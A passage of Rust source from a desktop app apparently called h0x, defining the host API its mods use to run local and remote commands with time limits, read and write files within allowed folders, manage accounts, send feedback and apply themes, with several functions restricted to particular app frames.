}

fn reader(reads: Rc<RefCell<LiveReads>>, key: &'static str, f: fn(&Snapshot) -> &Value) -> impl Fn(&gpui_shell::HostArguments) -> gpui_shell::HostResult {
    move |_| Ok(read(&reads, key, f))
}

/// Reads in callbacks and child views count too: keep their dependencies until the copy unloads.
pub fn snapshot_changed(copy: u64) -> bool {
    LIVE_READS.with_borrow(|copies| {
        copies.get(&copy).and_then(Weak::upgrade).is_some_and(|reads| {
            REVISIONS.with_borrow(|r| reads.borrow_mut().changed(r))
        })
    })
}

/// Delivers `command` to every shown copy of `mod`. Returns whether any listens.
pub fn send_command(name: &str, command: &str) -> bool {
    let shown = SHOWN_COPIES.with(|s| s.borrow().clone());
    COMMANDS.with(|c| {
        let mut c = c.borrow_mut();
        c.retain(|(_, _, tx)| !tx.is_closed());
        let mut any = false;
        for (copy, p, tx) in c.iter() {
            if p == name && shown.contains(copy) {
                any |= tx.try_send(command.to_owned()).is_ok();
            }
        }
        any
    })
}

/// Delivers `command` to one shown copy (the block given the keyboard, not
/// every copy of its mod).
pub fn send_command_to(copy: u64, command: &str) -> bool {
    if !SHOWN_COPIES.with(|s| s.borrow().contains(&copy)) {
        return false;
    }
    COMMANDS.with(|c| {
        let mut c = c.borrow_mut();
        c.retain(|(_, _, tx)| !tx.is_closed());
        c.iter().any(|(id, _, tx)| *id == copy && tx.try_send(command.to_owned()).is_ok())
    })
}

/// The copies on screen now (`prepare_load` numbers them).
pub fn set_shown_copies(copies: std::collections::HashSet<u64>) {
    SHOWN_COPIES.with(|s| *s.borrow_mut() = copies);
}

pub fn new_overlay_id() -> String {
    OVERLAY_SEQ.with(|s| {
        s.set(s.get() + 1);
        format!("o{}", s.get())
    })
}

/// One loaded copy of a mod: which folder, with which props.
#[derive(Clone, Debug, PartialEq)]
pub struct Instance {
    pub name: String,
    pub props: Value,
}

impl Instance {
    pub fn key(&self) -> String {
        if self.props.is_null() { self.name.clone() } else { format!("{}{}", self.name, self.props) }
    }
}

pub fn to_host(v: &Value) -> HostValue {
    match v {
        Value::Null => HostValue::Null,
        Value::Bool(b) => HostValue::Bool(*b),
        Value::Number(n) => HostValue::Number(n.as_f64().unwrap_or(0.0)),
        Value::String(s) => HostValue::Str(s.clone()),
        Value::Array(a) => HostValue::Array(a.iter().map(to_host).collect()),
        Value::Object(o) => HostValue::Object(o.iter().map(|(k, v)| (k.clone(), to_host(v))).collect()),
    }
}

pub fn from_host(v: &HostValue) -> Value {
    match v {
        HostValue::Null => Value::Null,
        HostValue::Bool(b) => Value::Bool(*b),
        HostValue::Number(n) if n.fract() == 0.0 && n.abs() < 9e15 => Value::from(*n as i64),
        HostValue::Number(n) => serde_json::Number::from_f64(*n).map_or(Value::Null, Value::Number),
        HostValue::Str(s) => Value::String(s.clone()),
        HostValue::Array(a) => Value::Array(a.iter().map(from_host).collect()),
        HostValue::Object(o) => Value::Object(o.iter().map(|(k, v)| (k.clone(), from_host(v))).collect()),
    }
}

pub const DECLARATIONS: &str = include_str!("../defaults/h0x.d.ts");

/// What a working agent is doing, for people (the runtime shows the same list).
pub const BUSY_VERBS: [&str; 24] = [
    "Oxygenating", "Hyperthinking", "Catalyzing", "Combusting", "Ionizing", "Bubbling", "Fizzing", "Distilling",
    "Synthesizing", "Crystallizing", "Percolating", "Kindling", "Smelting", "Forging", "Tinkering", "Conjuring",
    "Calibrating", "Untangling", "Brewing", "Sparking", "Weaving", "Assembling", "Noodling", "Pondering",
];

/// The busy verb for terminal `id`: the next one every 4 s since `working_since` (ms),
/// offset by a hash of the id so neighbours differ. Without `working_since`, the hash alone.
pub fn busy_verb(id: &str, working_since: Option<f64>, now: f64) -> String {
    let n = BUSY_VERBS.len() as u64;
    let step = working_since.map_or(0, |since| ((now - since).max(0.0) / 4000.0) as u64);
    let hash = id.bytes().fold(0u64, |h, b| h.wrapping_mul(31).wrapping_add(b.into()));
    format!("{}\u{2026}", BUSY_VERBS[((step % n + hash % n) % n) as usize])
}

/// `busyVerb(id, workingSince, now)` for mods.
fn busy_verb_call(a: &gpui_shell::HostArguments) -> gpui_shell::HostResult {
    Ok(busy_verb(a.string(0)?, a.get(1).and_then(HostValue::as_number), a.number(2)?).into())
}

fn strings(v: Option<&HostValue>) -> Vec<String> {
    v.and_then(HostValue::as_array).map(|a| a.iter().filter_map(|s| s.as_str().map(str::to_owned)).collect()).unwrap_or_default()
}

/// The only web pages a mod may open: the ones the Info page links to.
fn allowed_link(url: &str) -> bool {
    matches!(url, "https://pavii.tech" | "https://www.pavii.tech/products/dev-tools/docs/" | "https://buckleson.com")
}

fn opt_str(v: Option<&HostValue>, key: &str) -> Option<String> {
    v.and_then(|o| o.get(key)).and_then(HostValue::as_str).map(str::to_owned)
}

const EXEC_LIMIT: Duration = Duration::from_secs(30);
const EXEC_MAX: Duration = Duration::from_secs(600);
const EXEC_OUTPUT: u64 = 8 << 20;

fn exec_limit(options: Option<&HostValue>) -> Result<Duration, HostError> {
    match options.and_then(|o| o.get("timeout")) {
        // `timeout: undefined` reaches here as Null: both mean the default, as omitting it does.
        None | Some(HostValue::Null) => Ok(EXEC_LIMIT),
        Some(HostValue::Number(ms)) if ms.is_finite() && *ms > 0.0 => Ok(Duration::from_secs_f64(ms.min(EXEC_MAX.as_millis() as f64) / 1000.0)),
        _ => Err(HostError::new("timeout must be a positive number of milliseconds")),
    }
}

fn run_blocking(command: &str, args: &[String], cwd: Option<String>, limit: Duration) -> Result<(i32, String, String), String> {
    use std::io::Read;
    let mut cmd = crate::spawn::command(command);
    cmd.args(args).current_dir(cwd.map(PathBuf::from).unwrap_or_else(home)).stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped());
    // The chosen core's folder first, for mods' `core()`, without touching this process's PATH.
    if let Some(path) = crate::core_bin::path_with_core() {
        cmd.env("PATH", path);
    }
    let mut child = cmd.spawn().map_err(|e| format!("cannot run {command}: {e}"))?;
    // Bounded: a chatty command can't fill memory; the rest is drained and dropped.
    let drain = |r: Box<dyn Read + Send>| {
        std::thread::spawn(move || {
            let mut buf = Vec::new();
            let mut r = r;
            let _ = (&mut r).take(EXEC_OUTPUT).read_to_end(&mut buf);
            let _ = std::io::copy(&mut r, &mut std::io::sink());
            String::from_utf8_lossy(&buf).into_owned()
        })
    };
    let out = drain(Box::new(child.stdout.take().unwrap()));
    let err = drain(Box::new(child.stderr.take().unwrap()));
    let start = std::time::Instant::now();
    let status = loop {
        match child.try_wait() {
            Ok(Some(s)) => break s,
            Ok(None) if start.elapsed() > limit => {
                let _ = child.kill();
                let _ = child.wait();
                return Err(format!("{command} took longer than {} s and was stopped", limit.as_secs_f64()));
            }
            Ok(None) => std::thread::sleep(Duration::from_millis(10)),
            Err(e) => return Err(e.to_string()),
        }
    };
    Ok((status.code().unwrap_or(-1), out.join().unwrap_or_default(), err.join().unwrap_or_default()))
}

/// Runs a program on another machine through the core's exec: its exact output.
pub fn run_remote(machine: &str, command: &str, args: &[String], cwd: Option<String>) -> Result<(i32, Vec<u8>, Vec<u8>), String> {
    run_remote_with_limit(machine, command, args, cwd, EXEC_LIMIT)
}

fn run_remote_with_limit(machine: &str, command: &str, args: &[String], cwd: Option<String>, limit: Duration) -> Result<(i32, Vec<u8>, Vec<u8>), String> {
    use base64::Engine;
    let mut hc_args: Vec<String> = vec!["exec".into(), "--json".into(), "--on".into(), machine.into(), "--timeout".into(), limit.as_secs_f64().to_string()];
    if let Some(c) = cwd {
        hc_args.extend(["--cwd".into(), c]);
    }
    hc_args.push("--".into());
    hc_args.push(command.into());
    hc_args.extend(args.iter().cloned());
    // Let the remote timeout end the program and deliver its result before the wrapper expires.
    let (_, out, err) = run_blocking("h0x-core", &hc_args, None, limit + Duration::from_secs(5))?;
    let v: Value = serde_json::from_str(out.trim()).or_else(|_| serde_json::from_str(err.trim())).map_err(|_| format!("h0x-core exec: {}", err.trim()))?;
    if let Some(e) = v.get("error") {
        return Err(e.get("message").and_then(Value::as_str).unwrap_or("h0x-core exec failed").to_owned());
    }
    if v.get("timed_out").and_then(Value::as_bool) == Some(true) {
        return Err(format!("{command} took longer than {} s on {machine} and was stopped", limit.as_secs_f64()));
    }
    let bytes = |k: &str| base64::engine::general_purpose::STANDARD.decode(v.get(k).and_then(Value::as_str).unwrap_or_default()).map_err(|e| e.to_string());
    let code = v.get("code").and_then(Value::as_i64).map_or(-1, |c| c as i32);
    Ok((code, bytes("stdout")?, bytes("stderr")?))
}

/// A program's output here, if it ran (for the app's own checks).
pub fn run_here(command: &str, args: &[String]) -> Option<String> {
    run_blocking(command, args, None, EXEC_LIMIT).ok().map(|(_, out, _)| out)
}

/// What `openFile` does with a local file.
#[derive(Debug, PartialEq)]
enum OpenPlan {
    /// The editor reads it: nothing is done.
    Text,
    /// The system's default app opens it.
    Open,
    /// Shown in its folder (programs are never run).
    Reveal,
}

/// The same choice a terminal's Ctrl+click makes (`links::kind`), or a forced reveal.
fn open_plan(kind: crate::links::Kind, reveal: bool) -> OpenPlan {
    match kind {
        _ if reveal => OpenPlan::Reveal,
        crate::links::Kind::Text => OpenPlan::Text,
        crate::links::Kind::System => OpenPlan::Open,
        crate::links::Kind::Reveal => OpenPlan::Reveal,
    }
}

/// A full local path, or why not: relative, empty, NUL, or one that can name another machine.
fn local_full_path(path: &str) -> Result<PathBuf, String> {
    let p = PathBuf::from(path);
    if path.is_empty() || path.contains('\0') || !p.is_absolute() {
        return Err("needs a full path".into());
    }
    if crate::links::network(&p) {
        return Err("network paths are not opened".into());
    }
    Ok(p)
}

/// "opened", "revealed" or "text" (nothing done); anything else is why it failed.
fn open_file(path: &str, reveal: bool) -> String {
    let p = match local_full_path(path) {
        Ok(p) if p.exists() => p,
        Ok(_) => return "the file is not there".into(),
        Err(why) => return why,
    };
    match open_plan(crate::links::kind(&p), reveal) {
        OpenPlan::Text => "text".into(),
        OpenPlan::Open => {
            crate::links::open_default(&p);
            "opened".into()
        }
        OpenPlan::Reveal => {
            crate::links::open(&crate::links::Target::File(p));
            "revealed".into()
        }
    }
}

/// The agents a machine can start (`knownAgents()`), asked at most once a minute.
type InstalledCache = std::collections::HashMap<Option<String>, (std::time::Instant, Vec<String>, Vec<String>)>;
static SEEN: std::sync::Mutex<Option<InstalledCache>> = std::sync::Mutex::new(None);

/// Drops what `knownAgents()` remembered, after an install changed it.
pub fn forget_known_agents() {
    if let Ok(mut s) = SEEN.lock() {
        *s = None;
    }
}

/// Whether the agent `key` of `list` (`programs::startable()`) can start on a machine: asked
/// of the same once-a-minute check as `knownAgents()`. Blocks on a shell: not for the window thread.
pub fn agent_installed(on: Option<String>, list: Vec<Value>, key: &str) -> bool {
    known_agents(on, list).as_array().is_some_and(|a| a.iter().any(|v| v["key"] == key && v["installed"] == true))
}

fn known_agents(on: Option<String>, list: Vec<Value>) -> Value {
    let commands: Vec<String> = list.iter().filter_map(|a| a["run"][0].as_str().map(str::to_owned)).collect();
    let cached = SEEN.lock().ok().and_then(|s| s.as_ref()?.get(&on).filter(|(at, checked, _)| at.elapsed().as_secs() < 60 && checked == &commands).map(|(_, _, v)| v.clone()));
    let have = cached.unwrap_or_else(|| {
        let found = crate::programs::installed(&commands, on.as_deref());
        if let Ok(mut s) = SEEN.lock() {
            s.get_or_insert_with(std::collections::HashMap::new).insert(on.clone(), (std::time::Instant::now(), commands, found.clone()));
        }
        found
    });
    Value::Array(
        list.into_iter()
            .map(|mut a| {
                let run = a["run"][0].as_str().unwrap_or_default().to_owned();
                a["installed"] = json!(have.contains(&run));
                a
            })
            .collect(),
    )
}

/// `powershell.exe` arguments that print a file's bytes. The script travels as
/// base64 (`-EncodedCommand`), so no shell reads the path; inside it the path is
/// a single-quoted literal.
fn windows_read_args(path: &str) -> Vec<String> {
    use base64::Engine;
    let script = format!("$ErrorActionPreference = 'Stop'; $b = [IO.File]::ReadAllBytes({}); $o = [Console]::OpenStandardOutput(); $o.Write($b, 0, $b.Length)", crate::programs::powershell_quote(&path.replace('/', "\\")));
    let utf16: Vec<u8> = script.encode_utf16().flat_map(u16::to_le_bytes).collect();
    vec!["-NoProfile".into(), "-NonInteractive".into(), "-EncodedCommand".into(), base64::engine::general_purpose::STANDARD.encode(utf16)]
}

/// `\\server\share`, `//server/share` and `\\?\UNC\...`: reading one makes the remote machine open an SMB connection.
fn is_unc(path: &str) -> bool {
    path.replace('/', "\\").starts_with("\\\\")
}

/// A text file on another machine: `cat`, or PowerShell where there is none (Windows).
fn read_remote(machine: &str, path: &str) -> Result<Option<String>, String> {
    let (code, out, _) = match run_remote(machine, "cat", &["--".into(), path.into()], None) {
        Err(e) if e.contains("cannot start") => {
            if is_unc(path) {
                return Err("A network path cannot be read through another machine".into());
            }
            run_remote(machine, "powershell.exe", &windows_read_args(path), None)?
        }
        r => r?,
    };
    if code != 0 {
        return Ok(None);
    }
    if out.len() as u64 > crate::mod_files::LIMIT {
        return Err("Text file exceeds 1 MiB".into());
    }
    Ok(Some(String::from_utf8_lossy(&out).into_owned()))
}

fn exec_future(command: String, args: Vec<String>, cwd: Option<String>, on: Option<String>, limit: Duration) -> impl std::future::Future<Output = Result<HostValue, HostError>> + Send {
    let (tx, rx) = async_channel::bounded(1);
    let run = move || {
        let r = match on {
            Some(m) => run_remote_with_limit(&m, &command, &args, cwd, limit).map(|(c, o, e)| (c, String::from_utf8_lossy(&o).into_owned(), String::from_utf8_lossy(&e).into_owned())),
            None => run_blocking(&command, &args, cwd, limit),
        };
        let _ = tx.send_blocking(r);
    };
    #[cfg(not(test))]
    std::thread::spawn(run);
    // GPUI tests cannot be woken from a foreign thread. Queue the real result
    // before polling the receiver, without changing production dispatch.
    #[cfg(test)]
    run();
    async move {
        let (code, stdout, stderr) = rx.recv().await.map_err(|_| HostError::new("the command was lost"))?.map_err(HostError::new)?;
        Ok(HostObject::new().field("code", code as f64).field("stdout", stdout).field("stderr", stderr).into())
    }
}

const OPEN_FILE_REFUSED: &str = "opening files is for the files panel";
const INSTALL_REFUSED: &str = "installing OpenCode is for the welcome frame";
const ACCOUNT_REFUSED: &str = "accounts are for the settings and account frames";

/// Pairing a phone or Telegram, and starting the web panel, need a signed-in account: the core's
/// `bridge pair` and `bridge web`, run directly or after `--` of `run`. Listing, stopping, locking and unpairing stay open.
fn pairing_gate(args: &[String], signed_in: bool) -> Result<(), HostError> {
    let bridge = |a: &[String]| a.first().map(String::as_str) == Some("bridge") && matches!(a.get(1).map(String::as_str), Some("pair" | "web"));
    let after_run = args.iter().position(|a| a == "--").is_some_and(|i| args.get(i + 1).map(String::as_str) == Some("h0x-core") && bridge(&args[i + 2..]));
    if (bridge(args) || after_run) && !signed_in {
        return Err(HostError::new("Sign in to pair a phone or Telegram."));
    }
    Ok(())
}

fn account_json(a: &crate::auth::Account) -> Value {
    json!({ "uid": a.uid, "provider": a.provider, "name": a.name, "email": a.email, "picture": a.picture })
}

/// null on success (re-identifying analytics when the current account changed), else the reason.
fn account_change(done: Result<(), String>, identity_changed: bool) -> HostValue {
    match done {
        Ok(()) => {
            if identity_changed { crate::analytics::identify(crate::auth::current().as_ref()); }
            HostValue::Null
        }
        Err(why) => HostValue::Str(why),
    }
}

fn module(inst: Instance, copy: u64) -> HostModule {
    let reads = Rc::new(RefCell::new(LiveReads::default()));
    LIVE_READS.with_borrow_mut(|copies| {
        copies.retain(|_, reads| reads.strong_count() > 0);
        copies.insert(copy, Rc::downgrade(&reads));
    });
    let props = inst.props.clone();
    let feedback_frame = inst.name == "frame-feedback";
    let settings_frame = inst.name == "frame-settings";
    // Accounts are for two app frames alone (a person can't install a mod with a frame- name; mods/ is theirs to edit).
    let account_ok = settings_frame || inst.name == "frame-account";
    // The install runs a fixed recipe, but only onboarding offers it.
    let welcome_frame = inst.name == "frame-welcome";
    // Opening a file in the system's app is for the shipped files panel (the clicks of a person), nobody else.
    let files_panel = inst.name == "files";
    let feedback_from = inst.props.get("from").and_then(Value::as_str).unwrap_or("person").to_owned();
    let feedback_layout = inst.props.get("layout").and_then(Value::as_str).unwrap_or("other").to_owned();
    let (cmd_tx, commands) = async_channel::unbounded::<String>();
    COMMANDS.with_borrow_mut(|commands| {
        commands.retain(|(_, _, tx)| !tx.is_closed());
        commands.push((copy, inst.name.clone(), cmd_tx));
    });
    HostModule::new("h0x")
        .declarations(DECLARATIONS)
        .async_function("exec", |a| {
            let command = a.string(0)?.to_owned();
            Ok(exec_future(command, strings(a.get(1)), opt_str(a.get(2), "cwd"), opt_str(a.get(2), "on"), exec_limit(a.get(2))?))
        })
        .async_function("readTextFile", |a| {
            let path = a.string(0)?.to_owned();
            let on = opt_str(a.get(1), "on");
            let roots = if on.is_none() { crate::mod_files::allowed_roots() } else { Vec::new() };
            Ok(crate::mod_files::read_with(move || match on {
                Some(m) => read_remote(&m, &path),
                None => crate::mod_files::check(Path::new(&path), &roots).and_then(|_| crate::mod_files::read(Path::new(&path))),
            }))
        })
        .async_function("writeTextFile", |a| {
            let expected = a.get(2).and_then(|v| match v { HostValue::Str(s) => Some(s.clone()), _ => None });
            Ok(crate::mod_files::write_text(a.string(0)?.to_owned(), a.string(1)?.to_owned(), expected))
        })
        .async_function("removeAppFile", |a| Ok(crate::mod_files::remove_app_file(a.string(0)?.to_owned())))
        .async_function("core", |a| {
            let args = strings(a.get(0));
            pairing_gate(&args, crate::auth::signed_in())?;
            Ok(exec_future("h0x-core".into(), args, None, None, EXEC_LIMIT))
        })
        .function("busyVerb", busy_verb_call)
        .function("home", |_| Ok(home().to_string_lossy().into_owned().into()))
        .function("appHome", |_| Ok(app_dir().to_string_lossy().into_owned().into()))
        .function("fonts", |_| Ok(to_host(&json!(*FONTS.lock().unwrap()))))
        .function("updates", |_| Ok(to_host(&crate::update::status())))
        .function("presentUpdateNotes", |a| {
            crate::update_notes::presented(&strings(a.get(0)));
            Ok(HostValue::Null)
        })
        .function("feedbackPreview", move |a| {
            let images = a.get(2).and_then(|v| match v { HostValue::Number(n) => Some(*n as usize), _ => None }).unwrap_or(0);
            let body = crate::feedback::draft(a.string(0)?, a.string(1)?, images, &feedback_from, &feedback_layout);
            Ok(to_host(&json!({ "body": body })))
        })
        .function("feedbackPasteImage", move |_| {
            if !feedback_frame { return Err(HostError::new("feedback screenshots are frame-only")); }
            let bytes = gpui_shell::with_current_app(|cx| {
                cx.read_from_clipboard()?.entries().iter().find_map(|e| match e {
                    gpui::ClipboardEntry::Image(i) => Some(i.bytes.clone()),
                    _ => None,
                })
            }).flatten();
            Ok(match bytes {
                None => HostValue::Null,
                Some(b) => to_host(&match crate::feedback::attach(&b) { Ok(path) => json!({ "path": path }), Err(e) => json!({ "error": e }) }),
            })
        })
        .function("feedbackAttachImages", move |a| {
            if !feedback_frame { return Err(HostError::new("feedback screenshots are frame-only")); }
            let paths = strings(a.get(0)).into_iter().map(std::path::PathBuf::from).collect::<Vec<_>>();
            Ok(to_host(&json!(crate::feedback::attach_files(&paths))))
        })
        .async_function("feedbackPickImages", move |_| {
            if !feedback_frame { return Err(HostError::new("feedback screenshots are frame-only")); }
            let picked = gpui_shell::with_current_app(|cx| cx.prompt_for_paths(gpui::PathPromptOptions {
                files: true, directories: false, multiple: true, prompt: Some("Add".into()),
            })).ok_or_else(|| HostError::new("no window to pick from"))?;
            Ok(async move {
                let paths = picked.await.ok().and_then(Result::ok).flatten().unwrap_or_default();
                let out = crate::feedback::attach_files(&paths);
                Ok(to_host(&Value::Array(out)))
            })
        })
        .async_function("knownAgents", |a| {
            let on = opt_str(a.get(0), "on");
            // The table is loaded on the window thread; workers have only defaults.
            let list = crate::programs::startable();
            let (tx, rx) = async_channel::bounded(1);
            std::thread::spawn(move || {
                let _ = tx.send_blocking(known_agents(on, list));
            });
            Ok(async move { Ok(to_host(&rx.recv().await.unwrap_or(Value::Array(Vec::new())))) })
        })
        .function("installOpenCode", move |_| {
            if !welcome_frame { return Err(HostError::new(INSTALL_REFUSED)); }
            Ok(crate::agent_install::start().to_owned().into())
        })
        .async_function("pickFolder", |a| {
            let prompt = a.get(0).map(from_host).and_then(|v| v.get("prompt").and_then(Value::as_str).map(str::to_owned)).unwrap_or_else(|| "Open".into());
            let picked = gpui_shell::with_current_app(|cx| cx.prompt_for_paths(gpui::PathPromptOptions {
                files: false, directories: true, multiple: false, prompt: Some(prompt.into()),
            })).ok_or_else(|| HostError::new("no window to pick from"))?;
            Ok(async move {
                let path = picked.await.ok().and_then(Result::ok).flatten().and_then(|p| p.into_iter().next());
                Ok(path.map(|p| HostValue::Str(p.to_string_lossy().into_owned())).unwrap_or(HostValue::Null))
            })
        })
        .function("feedbackClearImages", move |_| {
            if feedback_frame { crate::feedback::clear_shots(); }
            Ok(HostValue::Null)
        })
        .async_function("sendFeedback", move |a| {
            if !feedback_frame { return Err(HostError::new("sending feedback is frame-only")); }
            let body = from_host(a.value(0)?);
            let shots: Vec<String> = from_host(a.value(1).unwrap_or(&HostValue::Null)).as_array()
                .map(|l| l.iter().filter_map(|v| v.as_str().map(str::to_owned)).collect()).unwrap_or_default();
            Ok(async move {
                Ok(match crate::feedback::send(body, shots).await {
                    Ok(()) => HostValue::Null,
                    Err(why) => HostValue::Str(why),
                })
            })
        })
        .function("account", move |_| {
            if !account_ok { return Err(HostError::new(ACCOUNT_REFUSED)); }
            let accounts: Vec<Value> = crate::auth::accounts().iter().map(account_json).collect();
            Ok(to_host(&json!({ "current": crate::auth::current().as_ref().map(account_json), "accounts": accounts })))
        })
        .async_function("accountSignIn", move |_| {
            if !account_ok { return Err(HostError::new(ACCOUNT_REFUSED)); }
            let (tx, rx) = async_channel::bounded(1);
            std::thread::spawn(move || {
                let _ = tx.send_blocking(crate::auth::sign_in(|url| crate::links::open(&crate::links::Target::Url(url.to_owned()))));
            });
            Ok(async move {
                Ok(match rx.recv().await {
                    Ok(Ok(_)) => {
                        crate::analytics::identify(crate::auth::current().as_ref());
                        HostValue::Null
                    }
                    Ok(Err(why)) => HostValue::Str(why),
                    Err(_) => HostValue::Str("sign-in was interrupted".into()),
                })
            })
        })
        .function("accountCancelSignIn", move |_| {
            if !account_ok { return Err(HostError::new(ACCOUNT_REFUSED)); }
            crate::auth::cancel_sign_in();
            Ok(HostValue::Null)
        })
        .function("accountSwitch", move |a| {
            if !account_ok { return Err(HostError::new(ACCOUNT_REFUSED)); }
            Ok(account_change(crate::auth::switch(a.string(0)?), true))
        })
        .function("accountSignOut", move |a| {
            if !account_ok { return Err(HostError::new(ACCOUNT_REFUSED)); }
            let uid = a.string(0)?;
            let was_current = crate::auth::current().is_some_and(|c| c.uid == uid);
            Ok(account_change(crate::auth::sign_out(uid), was_current))
        })
        .function("accountRemove", move |a| {
            if !account_ok { return Err(HostError::new(ACCOUNT_REFUSED)); }
            let uid = a.string(0)?;
            let was_current = crate::auth::current().is_some_and(|c| c.uid == uid);
            Ok(account_change(crate::auth::remove(uid), was_current))
        })
        .function("openLink", move |a| {
            if !settings_frame { return Err(HostError::new("opening links is frame-only")); }
            let url = a.string(0)?;
            if !allowed_link(url) { return Ok(HostValue::Str("that link is not allowed".into())); }
            crate::links::open(&crate::links::Target::Url(url.to_owned()));
            Ok(HostValue::Null)
        })
        .function("openFile", move |a| {
            if !files_panel { return Err(HostError::new(OPEN_FILE_REFUSED)); }
            let path = a.string(0)?;
            let reveal = a.get(1).map(from_host).is_some_and(|o| o["reveal"] == json!(true));
            Ok(HostValue::Str(open_file(path, reveal)))
        })
        .function("copyText", move |a| {
            if !settings_frame { return Err(HostError::new("copying is frame-only")); }
            let text = a.string(0)?;
            if text.len() > 4096 { return Ok(HostValue::Str("that is too long to copy".into())); }
            let text = text.to_owned();
            let done = gpui_shell::with_current_app(|cx| cx.write_to_clipboard(gpui::ClipboardItem::new_string(text)));
            Ok(if done.is_some() { HostValue::Null } else { HostValue::Str("no window to copy from".into()) })
        })
        .function("themes", |_| {
            let list: Vec<Value> = crate::settings::themes().into_iter().map(|(name, colors)| json!({ "light": crate::settings::theme_is_light(&name), "name": name, "colors": colors })).collect();
            Ok(to_host(&Value::Array(list)))
        })
        .function("playSound", |a| {
            crate::sound::play(a.string(0)?);
            Ok(HostValue::Null)
        })
        .function("run", |a| {
            let name = a.string(0)?.to_owned();
            let args = a.get(1).map(from_host).unwrap_or(Value::Null);
            if let Some(command) = crate::commands::find(&name) {
                crate::commands::validate_args(command, &args).map_err(HostError::new)?;
            }
            let final_kill = (name == "terminal.kill").then(|| FINAL_KILLS.with_borrow(Clone::clone)).flatten();
            if let Some((core, deadline)) = final_kill {
                if let Err(error) = core.call_timeout(&name, args, deadline.saturating_duration_since(std::time::Instant::now())) {
                    tracing::warn!("final terminal.kill: {error:#}");
                }
            } else {
                request(Request::Run { name, args });
            }
            Ok(HostValue::Null)
        })
        .function("spaces", reader(reads.clone(), "spaces", |s| &s.spaces))
        .function("machines", reader(reads.clone(), "machines", |s| &s.machines))
        .function("agents", reader(reads.clone(), "agents", |s| &s.agents))
        .function("panes", reader(reads.clone(), "panes", |s| &s.panes))
        .function("setAgentOrder", |a| {
            AGENT_ORDER.with(|s| *s.borrow_mut() = strings(a.get(0)));
            Ok(HostValue::Null)
        })
        .function("terminals", reader(reads.clone(), "terminals", |s| &s.terminals))
        .function("tree", reader(reads.clone(), "tree", |s| &s.tree))
        .function("focused", reader(reads.clone(), "focused", |s| &s.focused))
        .function("layout", reader(reads.clone(), "layout", |s| &s.layout))
        .function("layouts", |_| Ok(to_host(&json!(crate::window::layout_names()))))
        .function("commands", |_| {
            let list: Vec<Value> = crate::commands::COMMANDS
                .iter()
                .map(|c| {
                    let args: Vec<Value> = c.args.iter().map(|a| json!({ "name": a.name, "required": a.required })).collect();
                    json!({ "name": c.name, "args": args, "about": c.about })
                })
                .collect();
            Ok(to_host(&Value::Array(list)))
        })
        .function("window", reader(reads.clone(), "window", |s| &s.window))
        .function("revision", |_| Ok(HostValue::Number(snapshot_revision())))
        .function("windowVisible", |_| Ok(HostValue::Bool(window_visible())))
        .function("theme", |_| Ok(to_host(&serde_json::to_value(&*crate::settings::theme()).unwrap_or(Value::Null))))
        .function("settings", |_| Ok(to_host(&serde_json::to_value(&*crate::settings::get()).unwrap_or(Value::Null))))
        .function("keys", |_| {
            let list: Vec<Value> = crate::keys::listing().into_iter().map(|(s, k, a)| json!({ "section": s, "keys": k, "action": a })).collect();
            Ok(to_host(&Value::Array(list)))
        })
        .function("openOverlay", |a| {
            let mut spec = from_host(a.value(0)?);
            if spec.get("mod").is_none()
                && let Some(old) = spec.get("piece").cloned()
            {
                spec["mod"] = old;
            }
            if spec.get("mod").and_then(Value::as_str).is_none() && !spec.get("layout").is_some_and(Value::is_object) {
                return Err(HostError::new("openOverlay needs { mod: \"<folder>\" } or { layout: {...} }"));
            }
            let id = new_overlay_id();
            request(Request::OpenOverlay { id: id.clone(), spec });
            Ok(id.into())
        })
        .function("closeOverlay", |a| {
            request(Request::CloseOverlay { id: a.string(0)?.to_owned() });
            Ok(HostValue::Null)
        })
        .function("notify", |a| {
            let id = new_overlay_id();
            let n = from_host(a.value(0)?);
            request(Request::OpenOverlay { id: id.clone(), spec: json!({ "kind": "toast", "notification": n }) });
            Ok(id.into())
        })
        .function("placement", {
            let float = props.get("float").and_then(Value::as_str).map(str::to_owned);
            let reads = reads.clone();
            move |_| Ok(float.as_ref().map_or(HostValue::Null, |id| read(&reads, "floats", |s| s.floats.get(id).unwrap_or(&Value::Null))))
        })
        .function("props", move |_| Ok(to_host(&props)))
        .function("shared", |a| {
            let k = a.string(0)?;
            Ok(with_shared(|s| s.values.get(k).map(to_host).unwrap_or(HostValue::Null)))
        })
        .function("setShared", |a| {
            set_shared(a.string(0)?.to_owned(), from_host(a.value(1)?));
            Ok(HostValue::Null)
        })
        .async_function("watchFolder", |a| {
            let path = a.string(0)?.to_owned();
            crate::mod_files::check(Path::new(&path), &crate::mod_files::allowed_roots()).map_err(HostError::new)?;
            Ok(async move { crate::files::next_change(path).await.map(|v| to_host(&json!(v))).map_err(HostError::new) })
        })
        .async_function("nextCommand", move |_| {
            let rx = commands.clone();
            Ok(async move { rx.recv().await.map(HostValue::Str).map_err(|_| HostError::new("h0x-ade is shutting down")) })
        })
}

/// The runtime's base layer, themed from settings.json.
pub fn init(cx: &mut App) {
    gpui_shell::init(cx);
    apply_theme(cx);
}

/// Maps the theme onto the tokens mods read through `cx.theme().colors`.
pub fn apply_theme(cx: &mut App) {
    let t = crate::settings::theme();
    let g = |k: &str| t.get(k).cloned().unwrap_or_default();
    let palette = json!({
        "background": g("background"), "foreground": g("foreground"),
        "surface": g("surface"), "surface_foreground": g("foreground"),
        "primary": g("accent"), "primary_foreground": g("accent_foreground"),
        "secondary": g("raised"), "secondary_foreground": g("foreground"),
        "muted": g("raised"), "muted_foreground": g("muted"),
        "accent": g("hover"), "accent_foreground": g("foreground"),
        "destructive": g("blocked"), "destructive_foreground": g("background"),
        "border": g("border"), "input": g("input"), "ring": g("ring"),
        "selection": g("selection"),
    });
    match serde_json::from_value::<gpui_base::ColorTokens>(palette) {
        Ok(colors) => {
            let theme = gpui_base::Theme::global_mut(cx);
            theme.appearance = if crate::settings::get().dark { gpui_base::ThemeAppearance::Dark } else { gpui_base::ThemeAppearance::Light };
            theme.tokens.colors = colors;
        }
        Err(e) => tracing::error!("theme did not map onto mod tokens: {e}"),
    }
}

fn capabilities() -> Capabilities {
    Capabilities::new()
        .read_roots([home()])
        .write_roots([app_dir()])
        .execute(ExecuteGrant::Unrestricted)
        .network(NetworkGrant::Unrestricted)
        .storage(true)
        .clipboard_read(true)
        .clipboard_write(true)
}

/// Checks exercise shared state in memory, without reading or writing the person's file.
pub fn install_check_policy() {
    SHARED.with_borrow_mut(|slot| *slot = Some(SharedStore { values: Default::default(), path: app_dir().join("shared.json"), writable: false, writer: None }));
